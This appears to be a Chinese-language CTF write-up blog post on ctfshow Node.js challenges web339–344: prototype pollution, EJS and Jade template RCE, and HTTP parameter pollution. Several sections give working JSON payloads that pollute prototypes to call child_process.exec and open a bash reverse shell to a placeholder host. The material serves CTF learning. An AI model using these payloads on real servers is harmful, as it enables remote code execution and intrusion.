+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/* GET home page.  */</span>
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>关键看：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">Function - JavaScript | MDN (mozilla.org)</a></p>
+<p>JS 的函数实际上都是一个 <code>Function</code> 对象，它的参数为</p>
+<pre class="line-numbers language-none"><code class="language-none">new Function ([arg1[, arg2[, ...argN]],] functionBody)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>Function</code> 对象传入构造函数里的第一个是函数的形参，可以省略，第二个参数是函数体。</p>
+<p>写个小demo</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+ <span class="token keyword">var</span> user <span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+ body<span class="token operator">=</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__":&#123;"query":"return 123"&#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>控制台输出123。因为<code>Function</code>函数体就是<code>return 123</code>。</p>
+<p>所以思路就是我们先通过copy函数污染query的值，然后访问&#x2F;api触发。</p>
+<p>PAYLOAD：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec()</code>是运用的前面的RCE的知识。</p>
+<p>其实是相当于<code>require(&#39;child_process&#39;).exec()</code>，但是require不是全局的。</p>
+<blockquote>
+<p>require：This variable may appear to be global but is not. See <a target="_blank" rel="noopener" href="https://nodejs.org/api/modules.html#requireid"><code>require()</code></a></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://nodejs.org/api/globals.html#globals_require">Global objects | Node.js v19.4.0 Documentation (nodejs.org)</a></p>
+<p><code>bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1\&quot;</code> 反弹shell。之所以要套2层bash，就是本地测试，发现一层bash的话会报错。</p>
+<p>非预期解：</p>
+<p>这题用了ejs模板引擎，这个模板引擎有个漏洞可以rce：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h1 id="web340-原型链污染"><a href="#web340-原型链污染" class="headerlink" title="web340 原型链污染"></a>web340 原型链污染</h1><p>和上一题差不多，只不过这里不一样：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     
+  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+ res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+ <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到，<code>user.__proto__</code>并不是<code>Object.prototype</code>，<code>user.__proto__.__proto__</code>才是。</p>
+<p>因此污染两层即可：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h1 id="web341-ejs-rce"><a href="#web341-ejs-rce" class="headerlink" title="web341 ejs rce"></a>web341 ejs rce</h1><p>预期解ejs rce</p>
+<p>先进行一下原型链污染，再刷新一次即可</p>
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h1 id="web342、343-jade原型链污染"><a href="#web342、343-jade原型链污染" class="headerlink" title="web342、343 jade原型链污染"></a>web342、343 jade原型链污染</h1><p><strong>jade原型链污染</strong></p>
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;810&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在login页面打上去之后随便访问下，就会反弹。</p>
+<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
+<h1 id="web344-HTTP参数污染"><a href="#web344-HTTP参数污染" class="headerlink" title="web344 HTTP参数污染"></a>web344 HTTP参数污染</h1><p>HTTP参数污染。</p>
+<p>部分源码：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>url 中不能包含大小写 <code>8c</code>、<code>2c</code> 和 <code>逗号</code></p>
+<p>先构造一个正常请求</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现题目会过滤掉逗号，尝试 URL 编码， <code>urlencode(&quot;,&quot;) = %2c</code> 发现 <code>2c</code> 也被过滤</p>
+<p>HTTP协议中 允许 同名参数 出现多次，例如<code>?a=1&amp;a=2</code> ，有的服务端取的<code>1</code>，有的取的<code>2</code> 。不同服务端对同名参数处理都是不一样的，下面链接列举了一些：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p>
+<p><u>nodejs 会把同名参数以<strong>数组</strong>的形式存储，并且 <code>JSON.parse</code> 可以正常解析。</u></p>
+<p>因此构造</p>
+<pre class="line-numbers language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>这里把 ctfshow 的 c 进行url编码，是因为 双引号 的url编码是 <code>%22</code>，和 <code>c</code> 连接起来就是 <code>%22c</code>，会匹配到正则表达式。</p>
+</blockquote>
+
+  <p><a class="classtest-link" href="/tags/CTF/" rel="tag">CTF</a> — 2023年1月3日</p>
+  
+
+
+        </div>
+        <div class="row mt-2">
+  <h3>Search</h3>
+  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
+  <div style="margin-top: 1.5rem;">
+    <ul id="result"></ul>
+  </div>
+</div>
+        <div class="row mt-2">
+  
+    <div class="eight columns">
+      <p id="madewith">Made with ❤ and
+        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
+        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
+        </a>
+        
+    </div>
+
+    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
+    <div class="four columns mb-3 posisi" >
+      
+      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
+        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+      </a>
+      
+
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
+        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
+      </a>
+      
+
+      
+      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
+        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
+      </a>
+      
+
+      
+
+    </div>
+  
+</div>
+<script src="/js/prism/prism.js" async></script>
+      </div>
+
+    </div>
+
+  </div>
+  <script src="/js/nanobar.min.js"></script>
+
+  <script>
+    var options = {
+      classname: 'nanobar',
+      id: 'myNanobar'
+    };
+    var nanobar = new Nanobar(options);
+    nanobar.go(30);
+    nanobar.go(76);
+    nanobar.go(100);
+  </script>
+
+</body>
+
+</html>
